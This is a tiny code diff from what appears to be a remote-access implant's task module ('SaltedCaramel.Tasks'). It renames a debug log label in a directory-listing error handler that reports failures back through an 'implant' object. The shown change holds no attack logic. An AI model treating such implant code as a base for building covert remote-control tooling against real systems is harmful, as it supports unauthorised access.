@@ -49,7 +49,7 @@ namespace SaltedCaramel.Tasks
             }
             catch (DirectoryNotFoundException)
             {
-                Debug.WriteLine($"[!] DispatchTask - ERROR: Directory not found: {path}");
+                Debug.WriteLine($"[!] DirectoryList - ERROR: Directory not found: {path}");
                 implant.SendError(task.id, "Error: Directory not found.");
             }
         }
